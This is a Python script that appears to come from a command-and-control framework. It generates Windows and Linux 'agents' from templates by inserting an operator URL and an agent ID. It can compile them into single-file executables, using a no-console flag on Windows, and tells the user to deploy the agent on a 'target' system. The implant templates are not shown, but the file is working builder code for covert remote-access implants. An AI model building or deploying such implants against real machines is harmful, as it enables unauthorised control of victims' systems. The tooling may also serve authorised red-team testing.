#!/usr/bin/env python3
"""
Agent Generator
Generates custom agents for Windows and Linux platforms
"""

import os
import uuid
import shutil
from datetime import datetime

class AgentGenerator:
    def __init__(self, operator_url):
        self.operator_url = operator_url
        self.template_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'templates')
        self.output_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'generated_agents')

    def generate_agent(self, platform, output_name=None):
        """Generate an agent for the specified platform"""
        agent_id = str(uuid.uuid4())

        if platform.lower() == 'windows':
            template_file = os.path.join(self.template_dir, 'agent_template_windows.py')
            if not output_name:
                output_name = f"agent_windows_{agent_id[:8]}.py"
        elif platform.lower() == 'linux':
            template_file = os.path.join(self.template_dir, 'agent_template_linux.py')
            if not output_name:
                output_name = f"agent_linux_{agent_id[:8]}.py"
        else:
            raise ValueError(f"Unsupported platform: {platform}")

        # Read template
        with open(template_file, 'r') as f:
            template_content = f.read()

        # Replace placeholders
        agent_content = template_content.replace('{{OPERATOR_URL}}', self.operator_url)
        agent_content = agent_content.replace('{{AGENT_ID}}', agent_id)

        # Write generated agent
        output_path = os.path.join(self.output_dir, output_name)
        os.makedirs(self.output_dir, exist_ok=True)

        with open(output_path, 'w') as f:
            f.write(agent_content)

        # Copy modules directory
        modules_src = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'agent', 'modules')
        modules_dst = os.path.join(self.output_dir, 'modules')

        if os.path.exists(modules_dst):
            shutil.rmtree(modules_dst)
        shutil.copytree(modules_src, modules_dst)

        print(f"[+] Generated {platform} agent: {output_path}")
        print(f"[+] Agent ID: {agent_id}")
        print(f"[+] Operator URL: {self.operator_url}")

        return {
            "agent_id": agent_id,
            "platform": platform,
            "output_path": output_path,
            "generated_at": datetime.now().isoformat()
        }

    def compile_agent(self, agent_path, platform):
        """Compile agent to executable (requires PyInstaller)"""
        try:
            import PyInstaller.__main__

            output_name = os.path.basename(agent_path).replace('.py', '')

            PyInstaller.__main__.run([
                agent_path,
                '--onefile',
                '--noconsole' if platform.lower() == 'windows' else '',
                '--name', output_name,
                '--distpath', os.path.join(self.output_dir, 'compiled'),
                '--workpath', os.path.join(self.output_dir, 'build'),
                '--specpath', os.path.join(self.output_dir, 'spec')
            ])

            print(f"[+] Compiled agent: {output_name}")
            return True
        except ImportError:
            print("[!] PyInstaller not installed. Install with: pip install pyinstaller")
            return False
        except Exception as e:
            print(f"[!] Compilation failed: {e}")
            return False

if __name__ == '__main__':
    import sys

    if len(sys.argv) < 3:
        print("Usage: python agent_generator.py <platform> <operator_url>")
        print("Platforms: windows, linux")
        sys.exit(1)

    platform = sys.argv[1]
    operator_url = sys.argv[2]

    generator = AgentGenerator(operator_url)
    result = generator.generate_agent(platform)

    print("\n[*] Agent generated successfully!")
    print(f"[*] Deploy this agent on target {platform} system")
